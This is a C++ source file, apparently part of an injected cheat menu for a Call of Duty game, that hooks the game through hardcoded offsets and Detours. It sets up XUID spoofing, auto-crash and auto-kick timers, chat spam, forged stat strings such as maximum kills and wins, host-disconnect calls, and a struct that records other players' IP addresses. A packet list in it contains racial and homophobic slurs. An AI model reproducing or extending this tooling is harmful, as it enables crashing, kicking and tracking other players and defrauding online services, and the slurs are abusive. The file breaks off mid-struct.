#include "includes.h"
#include "detours.h"
#include "imgui/imgui_internal.h"
extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
#define OFFSET(x) ((INT64)GetModuleHandle(NULL) + (INT64)x)
#define s_UserDataForControllerMap OFFSET(0x340F180)
#define PI 3.14159265358979323846264338327950288
const void* spoof_t = (const void*)((DWORD64)GetModuleHandleA(NULL) + 0x2A9543B);



void AddToLog(std::string output);


Present oPresent;
HWND window = NULL;
WNDPROC oWndProc;
ID3D11Device* pDevice = NULL;
ID3D11DeviceContext* pContext = NULL;
ID3D11RenderTargetView* mainRenderTargetView;



std::vector<std::string> legit_packets = { "connectResponse","STFU_LOOZA", "statresponse", "LM", "disconnect", "LoadingNewMap" , "loadingnewmap" , "loadoutResponse", "infoResponse", "statusResponse", "keyAuthorize", "print", "echo", "fastrestart", "ping", "pinga", "steamAuthReq", "cfl", "Nigger", "faggot", "N1gger", "F4ggot", "fagg0t", "f4gg0t", "n1gg3r", "nigg3r", "bitch", "b1tch", "fuck", "rape", "r4pe", "cock", "c0ck"};
std::vector<int> config_strings = { 3514, 3627 };


#pragma once
#include "includes.h"



bool div_loop;
bool ct;
bool bCryptoSpend;
bool bDiviniumSpend;
bool friendonly = true;
bool open = true;
bool chatcrash;
bool crashreturn;
bool whitecard;
bool invisiblecard;
bool fovlul;
bool recents_probe = false;
bool forcehost;
bool cross_hair;
bool pointcrosshair;
bool crosscrosshair;
bool nazicrosshair;
bool circlecrosshair;
bool speed;
bool timescaling;
int MenuTab = 0;
int faken_rot;
INT64 spoofedXUID;
INT64 cacheXUID;
char spoofName[32];
int AutoCrashTMR = clock();
int AutoCrashTime = 12000;
int AutoKickTMR = clock();
int AutoKickTime = 12000;
int RequestTMR = clock();
int AutoRequestTime = 20000;
std::string chatspam_msg;
std::string chatspam_msg2;
std::string chatspam_msg3;
std::string chatspam_msg4;
bool hide_p2p_sessions;
bool hide_empty_sessions;
int slotItem = 0;
int class_sel = 0;




const char* slots[] = {
	"primary",
	"primaryattachment1",
	"primaryattachment2",
	"primaryattachment3",
	"primaryattachment4",
	"primaryattachment5",
	"primaryattachment6",
	"primaryattachment7",
	"primaryattachment8",
	"primaryattachment1cosmeticvariant",
	"primaryattachment2cosmeticvariant",
	"primaryattachment3cosmeticvariant",
	"primaryattachment4cosmeticvariant",
	"primaryattachment5cosmeticvariant",
	"primaryattachment6cosmeticvariant",
	"primaryattachment7cosmeticvariant",
	"primaryattachment8cosmeticvariant",
	"primarycamo",
	"primaryreticle",
	"primaryreticlecolor",
	"primarylens",
	"primaryemblem",
	"primarytag",
	"primarypaintjobslot",
	"primarypaintjobindex",
	"primarygunsmithvariant",
	"secondary",
	"secondaryattachment1",
	"secondaryattachment2",
	"secondaryattachment3",
	"secondaryattachment4",
	"secondaryattachment5",
	"secondaryattachment6",
	"secondaryattachment7",
	"secondaryattachment8",
	"secondaryattachment1cosmeticvariant",
	"secondaryattachment2cosmeticvariant",
	"secondaryattachment3cosmeticvariant",
	"secondaryattachment4cosmeticvariant",
	"secondaryattachment5cosmeticvariant",
	"secondaryattachment6cosmeticvariant",
	"secondaryattachment7cosmeticvariant",
	"secondaryattachment8cosmeticvariant",
	"secondarycamo",
	"secondaryreticle",
	"secondaryreticlecolor",
	"secondarylens",
	"secondaryemblem",
	"secondarytag",
	"secondarypaintjobslot",
	"secondarypaintjobindex",
	"secondarygunsmithvariant",
	"knifecamo",
	"primarygrenade",
	"primarygrenadecount",
	"primarygrenadestatus1"
	"primarygrenadestatus2"
	"primarygrenadestatus3"
	"specialgrenade",
	"specialgrenadecount",
	"specialgrenadestatus1",
	"specialgrenadestatus2",
	"specialgrenadestatus3",
	"primarygadget",
	"primarygadgetattachment1",
	"primarygadgetattachment2",
	"primarygadgetattachment3",
	"secondarygadget",
	"secondarygadgetattachment1",
	"secondarygadgetattachment2",
	"secondarygadgetattachment3",
	"specialgadget",
	"specialgadgetattachment1",
	"specialgadgetattachment2",
	"specialgadgetattachment3",
	"herogadget",
	"specialty1",
	"specialty2",
	"specialty3",
	"specialty4",
	"specialty5",
	"specialty6",
	"cybercom_tacrig1",
	"cybercom_tacrig2"
	"heroweapon",
	"herogadget",
	"cybercore",
	"cybercom_ability1",
	"cybercom_ability2",
	"cybercom_ability3",
	"bonuscard1",
	"bonuscard2",
	"bonuscard3",
	"equippedbubblegumpack",
	"firstSelectedCharacterIndex",
	"firstSelectedLoadoutType",
	"killStreak1",
	"killStreak2",
	"killStreak3",
	"killStreak4"
};

const char* customclass[] = {

	"Custom Class 1",
	"Custom Class 2",
	"Custom Class 3",
	"Custom Class 4",
	"Custom Class 5",
	"Custom Class 6",
	"Custom Class 7",
	"Custom Class 8",
	"Custom Class 9",
	"Custom Class 10"

};

const char* stats_pre[]{ " statsetbyname PLEVEL 11; statsetbyname RANKXP 14570200; statsetbyname PARAGON_RANKXP 52542000; uploadstats; updategamerprofile;" };
const char* modded_prest[]{ " statsetbyname PLEVEL 12; uploadstats; updategamerprofile;" };
const char* modded_prest2[]{ " statsetbyname PLEVEL 69; uploadstats; updategamerprofile;" };
const char* fucked_stats[]{ " statsetbyname LOSSES 1; statsetbyname WINS 2147483647; statsetbyname SUICIDES 2147483647; statsetbyname DEATHS 1; statsetbyname ASSISTS 2147483647; statsetbyname KILLS 2147483647; statsetbyname KDRATIO 2147483647; statsetbyname TIME_PLAYED_TOTAL 1; statsetbyname SCORE 2147483647; statsetbyname WLRATIO 2147483647;  uploadstats; updategamerprofile;" };
const char* stats_prestige[]{ " statsetbyname PLEVEL 5; uploadstats; updategamerprofile;" };
const char* reset_stats[]{ "PrestigeStatsResetAll; ClearCustomLeaderboards; PrestigeStatsReset; StarterPackPrestigeReset; statsetbyname PrestigeStatsResetAll PLEVEL; statsetbyname PrestigeStatsResetAll PLEVEL RANKXP" };
const char* contractsy[]{ "activateContract" };
const char* contractsn[]{ "deactivateContract" };
const char* moddedprest3[]{ " statsetbyname PARAGON_ICON_ID 50; uploadstats; updategamerprofile;" };

const char* PresenceActivityString(int idx)
{
	switch (idx)
	{
	case PRESENCE_ACTIVITY_MENU_FIRST: return "Main Menu";
	case PRESENCE_ACTIVITY_ONLINE_NOT_IN_TITLE: return "Online Not In Title";
	case PRESENCE_ACTIVITY_MENU_INLOBBY: return "In Lobby";
	case PRESENCE_ACTIVITY_MENU_LOOKING_FOR_PARTY: return "Looking For Party";
	case PRESENCE_ACTIVITY_MENU_LOOKING_FOR_PLAYERS: return "Looking For Players";
	case PRESENCE_ACTIVITY_MENU_LOCAL: return "Local";
	case PRESENCE_ACTIVITY_MENU_START: return "Start Screen";
	case PRESENCE_ACTIVITY_IN_TITLE: return "Title";
	case PRESENCE_ACTIVITY_NOT_IN_TITLE: return "Not In Title";
	case PRESENCE_ACTIVITY_MENU_LAST: return "Menu Last";
	case PRESENCE_ACTIVITY_CP_FIRST: return "CP Main Menu";
	case PRESENCE_ACTIVITY_CP_PLAYING_COOP_ON_MAP: return "CP Playing On COOP Map";
	case PRESENCE_ACTIVITY_CP_PLAYING_SOLO_ON_MAP: return "CP Playing On Solo Map";
	case PRESENCE_ACTIVITY_CP_PLAYING_COOP_IN_SAFEHOUSE: return "CP Playing COOP Safehouse";
	case PRESENCE_ACTIVITY_CP_PLAYING_SOLO_IN_SAFEHOUSE: return "CP Playing Solo Safehouse";
	case PRESENCE_ACTIVITY_CP_IN_LOBBY: return "CP In Lobby";
	case PRESENCE_ACTIVITY_CP_WATCHING_FILM: return "CP Watching Film";
	case PRESENCE_ACTIVITY_CP_LOOKING_FOR_PARTY: return "CP Looking For Party";
	case PRESENCE_ACTIVITY_CP_LOOKING_FOR_PLAYERS: return "CP Looking For Players";
	case PRESENCE_ACTIVITY_CP_PLAYING_LOCAL: return "CP Playing Local";
	case PRESENCE_ACTIVITY_CP_LAST: return "CP Last";
	case PRESENCE_ACTIVITY_MP_FIRST: return "MP First";
	case PRESENCE_ACTIVITY_MP_PLAYING_GMODE_ON_MAP: return "MP Playing ";
	case PRESENCE_ACTIVITY_MP_IN_LOBBY: return "MP In Lobby";
	case PRESENCE_ACTIVITY_MP_WATCHING_FILM: return "MP Watching Film";
	case PRESENCE_ACTIVITY_MP_LOOKING_FOR_PARTY: return "MP Looking For Party";
	case PRESENCE_ACTIVITY_MP_LOOKING_FOR_PLAYERS: return "MP Looking For Players";
	case PRESENCE_ACTIVITY_MP_PLAYING_LOCAL: return "MP Playing Local";
	case PRESENCE_ACTIVITY_MP_LAST: return "MP Last";
	case PRESENCE_ACTIVITY_ZM_FIRST: return "ZM Main Menu";
	case PRESENCE_ACTIVITY_ZM_PLAYING_MAP_ON_ROUND: return "ZM Playing Map";
	case PRESENCE_ACTIVITY_ZM_IN_LOBBY: return "ZM In Lobby";
	case PRESENCE_ACTIVITY_ZM_WATCHING_FILM: return "ZM Watching Film";
	case PRESENCE_ACTIVITY_ZM_LOOKING_FOR_PARTY: return "ZM Looking For Party";
	case PRESENCE_ACTIVITY_ZM_LOOKING_FOR_PLAYERS: return "ZM Looking For Players";
	case PRESENCE_ACTIVITY_ZM_PLAYING_LOCAL: return "Playing Local";
	case PRESENCE_ACTIVITY_ZM_LAST: return "ZM Last";
	case PRESENCE_ACTIVITY_LAST: return "Activity Last";

	default:
		std::string cmd = std::string("Unknown Value: ") + std::to_string(idx);
		return cmd.c_str();
		break;
	}
}

HMODULE dllbase;

float BOG_TO_GRD(float BOG)
{
	return (180 / PI) * BOG;
}

float GRD_TO_BOG(float GRD)
{
	return (PI / 180) * GRD;
}

inline void SetXUIDSpoofed(bool isSpoofed)
{
	if (isSpoofed)
	{
		if (!spoofedXUID)
		{
			return;
		}
		**(__int64**)s_UserDataForControllerMap = spoofedXUID;
		return;
	}
	**(__int64**)s_UserDataForControllerMap = cacheXUID;
}

std::uintptr_t qwProcessBase = reinterpret_cast<std::uintptr_t>(GetModuleHandleA(nullptr));
using ControllerIndex_t = std::uint32_t;
using ClientNum_t = std::uint32_t;

std::uintptr_t lobbymsg_prints_bak; //dvar in handlepacketinternal
std::uintptr_t loc_warnings_bak;
std::uintptr_t sumshitidkwhat_bak;
std::uintptr_t cg_draw2d_bak; //dvar in cg_draw2d
std::uintptr_t cgArray;

typedef char* (__fastcall* tSomeHostBs1)(unsigned int a1);
tSomeHostBs1 SomeHostBsTwo = (tSomeHostBs1)(qwProcessBase + 0x1ECB2B0);

DWORD_PTR pUserData = qwProcessBase + 0x14FB3420;
DWORD_PTR pNameBuffer = qwProcessBase + 0x15E84638;
DWORD_PTR ISteamFriends = *(DWORD_PTR*)(qwProcessBase + 0x10BBCBA0);



DWORD_PTR pGetPersonaNameReturn = qwProcessBase + 0x1EB0DEC;

typedef char* (__fastcall* tGetPersonaName) (DWORD_PTR _this);
tGetPersonaName oGetPersonaName;

typedef __int64(__fastcall* tLiveSteam_FilterPersonaName)(char* buffer, int size, char asciionly);
tLiveSteam_FilterPersonaName oLiveSteam_FilterPersonaName = (tLiveSteam_FilterPersonaName)(qwProcessBase + 0x1EB02C0);

typedef void(__fastcall* SV_ExecuteClientCommandT)(__int64 client_t, __int64 command, int clientOK, int fromOldServer);
SV_ExecuteClientCommandT SV_ExecuteClientCommand = (SV_ExecuteClientCommandT)(qwProcessBase + 0x224A380);

typedef void(__fastcall* GameSendServerCommandT)(int clientNum, int reliable, const char* command);
GameSendServerCommandT SV_GameSendServerCommand = (GameSendServerCommandT)(qwProcessBase + 0x224F580);

typedef bool(__fastcall* LootT)(int controllerIndex, __int64 index, unsigned int incAmount);
LootT GiveLootToSelf = (LootT)(qwProcessBase + 0x1E82C50);


typedef __int64(__fastcall* somefuncidkwtfthisisT)(int a1);
somefuncidkwtfthisisT somefuncidkwtfthisis = (somefuncidkwtfthisisT)(qwProcessBase + 0x1EEB6F0);

typedef __int64(__fastcall* tObituary)(int a1, unsigned char* killer, char a3, __int64 killed, char a5, __int64 a6, float a7, float a8, bool a9);
tObituary Obituary = reinterpret_cast<tObituary>(qwProcessBase + 0x1337360);

typedef __int64(__fastcall* SumShitS)(int, int);
SumShitS sumshit = (SumShitS)(qwProcessBase + 0x1C3D70);

const static auto sumgbcrashsidk = reinterpret_cast<long int(*)(__int64 xuid)>(qwProcessBase + 0x9CB0);




//_____Commands_____\\

//--->Cmds

const static auto Cmd_ExecuteSingleCommand = reinterpret_cast<std::uintptr_t(__fastcall*)(int, int, const char* text, bool)>(qwProcessBase + 0x20ED380);


//--->Dvars

const static auto Dvar_SetFromStringByName = reinterpret_cast<std::uintptr_t(__fastcall*)(const char* dvarName, const char* string, bool createIfMissing)>(qwProcessBase + 0x22C7500);
const static auto Cbuf_AddText = reinterpret_cast<std::uintptr_t(__fastcall*)(int, const char*)>(qwProcessBase + 0x20EC010);

//--->Clients

const static auto CL_AddReliableCommand = reinterpret_cast<std::uintptr_t(__fastcall*)(int, const char*)>(qwProcessBase + 0x135D4C0);
const static auto CL_ConnectionlessCMD = reinterpret_cast<char(__fastcall*)(LocalClientNum_t localClientNum, netadr_t from, msg_t * msg)>(qwProcessBase + 0x134CDAD);//134CD50
const static auto CL_ParseServerMessage = reinterpret_cast<void(*)(LocalClientNum_t localClientNum, msg_t * msg, double a3, double a4)>(qwProcessBase + 0x13661D0);
const static auto CL_IsLocalClientInGame = reinterpret_cast<std::uintptr_t(__fastcall*)(int localClientNum)>(qwProcessBase + 0x13598E0);
const static auto CL_GetConfigString = reinterpret_cast<const char* (*)(int configStringIndex)>(qwProcessBase + 0x1321110);
const static auto CL_StoreConfigString = reinterpret_cast<const char* (*)(int configStringIndex, const char* string)>(qwProcessBase + 0x13667C0);



//--->NET

const static auto NET_OutOfBandPrint = reinterpret_cast<bool(__fastcall*)(netsrc_t, netadr_t, const char* length)>(qwProcessBase + 0x2173710);
const static auto NET_SendPacket = reinterpret_cast<bool(*)(netsrc_t sock, const char* length, uint32 data, netadr_t to)>(qwProcessBase + 0x23323B0);
//NS_SERVER
//>=0 maybe >1256 overfloaw
//


//--->System

const static auto Sys_Milliseconds = reinterpret_cast<std::uint64_t(*)()>(qwProcessBase + 0x2333430);

const static auto HandlePacketInternal = reinterpret_cast<char(__fastcall*)(ControllerIndex_t controllerIndex, netadr_t fromAdr, __int64 fromXUID, LobbyType lobbyType, int a5, msg_t * a6)>(qwProcessBase + 0x1EF7FE0);



//_____LobbyMSGs_____\\

//--->lmwrites


static auto LobbyMsgRW_PackageElement_xor_al(qwProcessBase + 0x1EF65E5);
const static auto LobbyMsgRW_PackageElement2 = reinterpret_cast<bool(*)(void* lobbyMsg, bool addElement)>(qwProcessBase + 0x1EF65C2);
const static auto LobbyMsgRW_PackageInt = reinterpret_cast<bool(*)(void* lobbyMsg, const char* key, int32_t * val)>(qwProcessBase + 0x1EF66D0);
const static auto LobbyMsgRW_PackageUChar = reinterpret_cast<bool(*)(void* lobbyMsg, const char* key, uint8_t * val)>(qwProcessBase + 0x1EF6800);
const static auto LobbyMsgRW_PackageString = reinterpret_cast<bool(*)(void* lobbyMsg, const char* key, char* val, int maxLength)>(qwProcessBase + 0x1EF67C0);
const static auto LobbyMsgRW_PackageXuid = reinterpret_cast<bool(*)(void* lobbyMsg, const char* key, uint64_t * val)>(qwProcessBase + 0x1EF6940);
const static auto LobbyMsgRW_PackageBool = reinterpret_cast<bool(*)(void* lobbyMsg, const char* key, char* val)>(qwProcessBase + 0x1EF6580);
const static auto LobbyMsgRW_PackageUInt = reinterpret_cast<bool(*)(void* lobbyMsg, const char* key, unsigned __int32* val)>(qwProcessBase + 0x1EF68A0);
const static auto LobbyMsgRW_PackageShort = reinterpret_cast<bool(*)(void* lobbyMsg, const char* key, __int16* val)>(qwProcessBase + 0x1EF6750);
const static auto LobbyMsgRW_PackageUInt64 = reinterpret_cast<bool(*)(void* lobbyMsg, const char* key, unsigned __int64* val)>(qwProcessBase + 0x1EF6820);
const static auto LobbyMsgRW_PackageArrayStart = reinterpret_cast<bool(*)(void* lobbyMsg, const char* key)>(qwProcessBase + 0x1EF6510);
const static auto LobbyMsgRW_PackageGlob = reinterpret_cast<bool(*)(void* lobbyMsg, const char* key, char* val, int maxLength)>(qwProcessBase + 0x1EF66B0);
const static auto LobbyMsgRW_PackageFloat = reinterpret_cast<bool(*)(void* lobbyMsg, const char* key, float* val)>(qwProcessBase + 0x1EF6630);
const static auto LobbyMsgRW_PackageUShort = reinterpret_cast<bool(*)(void* lobbyMsg, const char* key, unsigned __int16* val)>(qwProcessBase + 0x1EF6920);
const static auto LobbyMsgRW_PackageByte = reinterpret_cast<bool(*)(void* lobbyMsg, const char* key, byte * val)>(qwProcessBase + 0x1EF65A0);


const static auto LobbyMsgRW_PrepWriteMsg = reinterpret_cast<bool(*)(LobbyMsg*, char*, int data, MsgType msgType)>(qwProcessBase + 0x1EF6A30);
const static auto LobbyMsgRW_PrepReadData = reinterpret_cast<bool(__fastcall*)(LobbyMsg*, char*, int)>(qwProcessBase + 0x1EF69C0);
const static auto LobbyMsgRW_PrepReadMsg = reinterpret_cast<bool(*)(LobbyMsg*, msg_t*)>(qwProcessBase + 0x1EF69F0);



//--->lm

const static auto LobbyMsg_HandleIM = reinterpret_cast<std::uintptr_t(__fastcall*)(unsigned int targetController, __int64 senderXuid, void* buff, int len)>(qwProcessBase + 0x1EF63E0);
const static auto LobbyMsg_SendInfoRequest = reinterpret_cast<bool(__fastcall*)(const ControllerIndex_t, const std::uint64_t*, int, const Msg_InfoRequest*)>(qwProcessBase + 0x1EE5470);
const static auto LobbyMsg_SendInfoResponse = reinterpret_cast<bool(__fastcall*)(const ControllerIndex_t, const std::uint64_t*, int, const Msg_InfoResponse*)>(qwProcessBase + 0x1EE0040);
const static auto LobbyDebug_MsgSent = reinterpret_cast<void(__fastcall*)(ControllerIndex_t controllerIndex, netadr_t adr, MsgType msgType, const char* customData)>(qwProcessBase + 0x1EEEB30);
const static auto Live_IsDemonwareFetchingDone = reinterpret_cast<bool(*)(const ControllerIndex_t)>(qwProcessBase + 0x1EE5FE0);


//--->lcm

const static auto LobbyClientMsg_SendModifiedStats = reinterpret_cast<std::uintptr_t(__fastcall*)(int, int)>(qwProcessBase + 0x1ED4210);
const static auto LobbyClientMsg_SendDisconnectClient = reinterpret_cast<bool(__fastcall*)(const ControllerIndex_t controllerIndex, LobbyType lobbyType, __int64 xuid, __int32 disconnectClient)>(qwProcessBase + 0x1EE16C0);
const static auto LobbyClientMsg_SendHostDisconnect = reinterpret_cast<bool(__fastcall*)(const ControllerIndex_t controllerIndex, LobbyType lobbyType, __int64 xuid, __int32 disconnectClient)>(qwProcessBase + 0x1EE2BA0);
const static auto Name_Thing = reinterpret_cast<int(__fastcall*)(int* a1, __int64 a2, unsigned __int64 a3)>(qwProcessBase + 0x2C3DE60);
const static auto Steam_GetName_Thing = reinterpret_cast<UINT8(__fastcall*)(UINT8 * a1, int a2, char a3)>(qwProcessBase + 0x1EB0D30);


//--->lvm

const static auto LobbyVM_OnDisconnect = reinterpret_cast<__int64(__fastcall*)(LobbySession * lobbySession, __int64 xuid, __int32 disconnectClient)>(qwProcessBase + 0x1EEFEC0);
const static auto LobbyVM_JoinEvent = reinterpret_cast<std::uintptr_t(__fastcall*)(int controllerIndex, uint64_t xuid, int joinType)>(qwProcessBase + 0x1EEF890);
//const static auto LivePresence_Set = reinterpret_cast<__int64(__fastcall*)(unsigned int controllerIndex, const char * name)>(qwProcessBase + 0x1E943A0);
//const static auto LobbyGame_SetMap = reinterpret_cast<__int64(__fastcall*)(const char* map_name)>(qwProcessBase + 0x1EEAD00);
const static auto Loot_BuyCrate = reinterpret_cast<bool(*)(int ControllerIndex, int CrateType, unsigned int CurrencyType)>(qwProcessBase + 0x1E82480);
const static auto Loot_SpendVials = reinterpret_cast<bool(*)(unsigned int ControllerIndex, int VialNum)>(qwProcessBase + 0x1E83860);




//--->ltransport

const static auto LobbyMsgTransport_SendToAdr = reinterpret_cast<__int64(__fastcall*)(ControllerIndex_t controllerIndex, int channel, LobbyModule destModule, netadr_t adr, __int64 toXuid, msg_t * msg, MsgType msgType)>(qwProcessBase + 0x1EF8800);
const static auto LobbyMsgTransport_SendToHostReliably = reinterpret_cast<uint32_t(__fastcall*)(ControllerIndex_t controllerIndex, LobbySession * lobbySession, LobbyModule destModule, msg_t * msg, MsgType msgType, const NetChanMsgType_e netchanChannel, netchanMsgConfig_t * msgConfig)>(qwProcessBase + 0x1EF8CA0);
const static auto LobbyMsgTransport_SendToClientReliably = reinterpret_cast<bool(__fastcall*)(ControllerIndex_t controllerIndex, LobbySession * lobbySession, LobbyModule destModule, msg_t * msg, MsgType msgType, XUID toXuid, NetChanMsgType_e netchanChannel, netchanMsgConfig_t * msgConfig)>(qwProcessBase + 0x1EF8930);
const static auto LobbyMsgTransport_SendOutOfBand = reinterpret_cast<bool(__fastcall*)(ControllerIndex_t controllerIndex, __int64 targetXuid, netadr_t adr, msg_t * msg, MsgType msgType)>(qwProcessBase + 0x1EF8420);
const static auto LobbyMsgTransport_SendTo = reinterpret_cast<bool(__fastcall*)(ControllerIndex_t controllerIndex, LobbySession * lobbySession, LobbyModule destModule, msg_t * msg, MsgType msgType, NetChanMsgType_e channel, netchanMsgConfig_t * a7)>(qwProcessBase + 0x1EF8530);
//const static auto Netchan_SendMessage = reinterpret_cast<__int64(__fastcall*)(unsigned __int32 localControllerIndex, NetChanMsgType_e msgType, NetchanMsgMode_e mode, byte * data,size_t dataLen, uint64_t destXUID,  netadr_t to, netchanMsgConfig_t * messageConfig, const char* msgName)>(qwProcessBase + 0x2176A60);




//--->Classes

const static auto Class1 = reinterpret_cast<std::uintptr_t(__fastcall*)()>(qwProcessBase + 0x20F68B0);
const static auto Class2 = reinterpret_cast<std::uintptr_t(__fastcall*)()>(qwProcessBase + 0x20F6D30);
const static auto Class3 = reinterpret_cast<std::uintptr_t(__fastcall*)(__int64, __int64)>(qwProcessBase + 0x1EAF0B0);
const static auto Class4 = reinterpret_cast<std::uintptr_t(__fastcall*)(char*, __int64, __int64)>(qwProcessBase + 0x1EAF090);
const static auto Class5 = reinterpret_cast<std::uintptr_t(__fastcall*)(const char*)>(qwProcessBase + 0x26A7710);
const static auto SetClass = reinterpret_cast<std::uintptr_t(__fastcall*)(char*, __int64, __int64, __int64)>(qwProcessBase + 0x16C8A0);




//_____Players Infos_____\\


//--->LobbySessions

const static auto LobbySession_GetClientNetAdrByIndex = reinterpret_cast<netadr_t(__fastcall*)(const LobbyType lobbyType, const ClientNum_t clientNum)>(qwProcessBase + 0x1ECC090);
const static auto LobbySession_GetControllingLobbySession = reinterpret_cast<bool(__fastcall*)(const LobbyModule lobbyModule)>(qwProcessBase + 0x1ECC170);
const static auto LobbySession_GetSession = reinterpret_cast<LobbySession * (__fastcall*)(unsigned int a1)>(qwProcessBase + 0x1ECDA20);
const static auto LobbySession_GetClientByClientNum = reinterpret_cast<SessionClient * (*)(LobbySession*, ClientNum_t)>(qwProcessBase + 0x1F00070);
const static auto LobbyHost_RemoveClient = reinterpret_cast<char(*)(LobbyType lobbyType, ActiveList * xuid, const char* reason)>(qwProcessBase + 0x1F01A00);
const static auto LobbySearch_SearchSession = reinterpret_cast<__int64(*)(LobbySession * lobbySession)>(qwProcessBase + 0x1EFC500);
const static auto LobbySession_GetClientByXuid = reinterpret_cast<SessionClient * (__fastcall*)(LobbySession * lobbySession, XUID xuid)>(qwProcessBase + 0x1F000A0);
const static auto PCache_Update = reinterpret_cast<void(__fastcall*)(ControllerIndex_t controllerIndex, bool limitedUpdate)>(qwProcessBase + 0x1E8E1B0);
const static auto PCache_GetPlayerRichPresenceInfo = reinterpret_cast<const PresenceData * (__fastcall*)(int controllerIndex, UINT64)>(qwProcessBase + 0x1E8DB70);



//--->Live

const static auto Live_IsUserSignedInToDemonware = reinterpret_cast<bool(*)(const ControllerIndex_t)>(qwProcessBase + 0x1E0D710);
const static auto LiveFriends_IsFriendByXUID = reinterpret_cast<bool(__fastcall*)(int controllerIndex, __int64 XUID)>(qwProcessBase + 0x1DF93A0);
const static auto Live_IsUserInGame = reinterpret_cast<bool(*)(const ControllerIndex_t controllerIndex)>(qwProcessBase + 0x1EC7110);
const static auto LiveStats_SetClanTagText = reinterpret_cast<std::uintptr_t(__fastcall*)(int, const char*)>(qwProcessBase + 0x1EA5480);
const static auto LiveUser_GetXUID = reinterpret_cast<__int64(__fastcall*)(int)>(qwProcessBase + 0x1EC7310);
const static auto LiveUser_GetClientName = reinterpret_cast<char* (__fastcall*)(int)>(qwProcessBase + 0x1EC72E0);
const static auto LiveUser_GetProfilByXUID = reinterpret_cast<__int64(__fastcall*)(__int64 xuid)>(qwProcessBase + 0x1EB0F80);
const static auto LiveUser_FriendRequestByXUID = reinterpret_cast<__int64(__fastcall*)(__int64 xuid)>(qwProcessBase + 0x1EB0EC0);
const static auto LiveUser_IsXUIDLocalPlayer = reinterpret_cast<__int64(__fastcall*)(int)>(qwProcessBase + 0x1EC6DD0);
const static auto LiveUser_IsXUIDLocalPlayer2 = reinterpret_cast<__int64(__fastcall*)(int)>(qwProcessBase + 0x1EC7130);
const static auto LiveInvites_SendJoinInfo = reinterpret_cast<__int64(__fastcall*)(ControllerIndex_t controllerIndex, __int64 recepientxuid, __int64 a3)>(qwProcessBase + 0x1E7E870);
const static auto Live_IsHost = reinterpret_cast<bool(*)()>(qwProcessBase + 0x1E25DC0);



const static auto LiveGroups_GetErrorMessage = reinterpret_cast<__int64(__fastcall*)(int msgcode)>(qwProcessBase + 0x1E022C0);






//const static auto Live_GetTeam = reinterpret_cast<char* (__fastcall*)()>(qwProcessBase + 0x2F0E390);//pas update



//--->Demonware

const static auto dwInstantDispatchMessage = reinterpret_cast<int64(__fastcall*)(int64 SenderId, unsigned int controllerIndex, __int64 msg, unsigned int messageSize)>(qwProcessBase + 0x143A600);
const static auto dwNetadrToCommonAddr = reinterpret_cast<bool(*)(netadr_t, void*, const unsigned int, bdSecurityID*)>(qwProcessBase + 0x143DA60);
const static auto dwCommonAddrToNetadr = reinterpret_cast<bool(*)(netadr_t* const, const void* const, const bdSecurityID*)>(qwProcessBase + 0x143C360);
const static auto dwInstantSendMessage = reinterpret_cast<void* (*)(const ControllerIndex_t, const std::uint64_t*, std::uint32_t, std::uint8_t, const void*, unsigned int)>(qwProcessBase + 0x143A810);
const static auto dwRegisterSecIDAndKey = reinterpret_cast<bool(*)(const bdSecurityID*, const bdSecurityKey*)>(qwProcessBase + 0x143E120);


//--->Com


const static auto jmp_dwptr_rbx = (qwProcessBase + 0x2A9643B);
const static auto _Storage_GetDDLRootState_ = (qwProcessBase + 0x2276B80);
const static auto _Storage_GetDDLContext_ = (qwProcessBase + 0x2276AB0);
const static auto _DDL_MoveToPath_ = (qwProcessBase + 0x2522470);
const static auto _DDL_SetUInt_ = (qwProcessBase + 0x2522970);
const static auto Com_IsInGame = reinterpret_cast<bool(*)()>(qwProcessBase + 0x21482C0);




//_____Miscelleanous_____\\


//--->ClientGame

//const static auto CG_CharacterCustomization_EquipCharacter = reinterpret_cast<bool(__fastcall*)(unsigned int ControllerIndex, unsigned int eModes, uint CharacterIndex)>(qwProcessBase + 0x19E1F0);
const static auto CG_KillfeedMSG = reinterpret_cast<std::uintptr_t(__fastcall*)(int clientNum, const char* msg)>(qwProcessBase + 0x8CB400);
const static auto CG_BoldGameMessageCenter = reinterpret_cast<std::uintptr_t(__fastcall*)(int clientNum, const char* msg, int duration)>(qwProcessBase + 0x8C4C80);
const static auto CG_BoldGameMessage = reinterpret_cast<std::uintptr_t(__fastcall*)(int clientNum, const char* msg)>(qwProcessBase + 0x8C4C30);
//const static auto CG_GameMessage = reinterpret_cast<std::uintptr_t(__fastcall*)(LocalClientNum_t localClientNum, const char* msg)>(qwProcessBase + 0x22EA0F0);

//--->ServerGame

const static auto G_ChatSendMSG = reinterpret_cast <std::uintptr_t(__fastcall*)(int clientnum, const char* text, int chattype)>(qwProcessBase + 0x1DEAAD0);





//_____Messages_____\\


const static auto MSG_Discard = reinterpret_cast<void(*)(msg_t*)>(qwProcessBase + 0x2154D90);
const static auto MSG_Init = reinterpret_cast<void(*)(msg_t * buf, byte * data, int length)>(qwProcessBase + 0x2154F80);
const static auto MSG_InitReadOnly = reinterpret_cast<void(*)(msg_t*, const char*, int)>(qwProcessBase + 0x2155010);
const static auto MSG_BeginReading = reinterpret_cast<void(*)(msg_t*)>(qwProcessBase + 0x2154D00);
const static auto MSG_ReadByte = reinterpret_cast<std::uint8_t(*)(msg_t*)>(qwProcessBase + 0x2155450);
const static auto MSG_ReadData = reinterpret_cast<void(*)(msg_t*, void*, int)>(qwProcessBase + 0x21554B0);
const static auto MSG_InfoResponse = reinterpret_cast<bool(*)(void*, LobbyMsg*)>(qwProcessBase + 0x1EE1E60);



void send_info_request(const std::uint64_t target_steam_id) //basic info request
{
	if (!Live_IsUserSignedInToDemonware(0))
		return;

	const Msg_InfoRequest message{ 1 };
	LobbyMsg_SendInfoRequest(0, &target_steam_id, 1, &message);
}





#define Hook(original, hook) (DetourTransactionBegin(), DetourUpdateThread(GetCurrentThread()), DetourAttach((LPVOID*)&original, (LPVOID)hook), DetourTransactionCommit())
#define Unhook(original, hook) (DetourTransactionBegin(), DetourUpdateThread(GetCurrentThread()), DetourDetach((LPVOID*)&original, (LPVOID)hook), DetourTransactionCommit())

struct response_t
{
	bool valid;
};

struct recent_t {

	std::uint64_t xuid;
	std::string time = "b"s;
	std::string name;
	std::string ip;
	netadr_t netadr;
	const char* activity;
	int actitity_i;
	response_t response;
	InfoResponseLobby Lobby[3];
	bdSecurityID secId;
	bool sent = { false };

	std::chrono::time_point<std::chrono::high_resolution_clock> last_checked;
};


struct friends_t
{


	std::uint64_t steam_id;
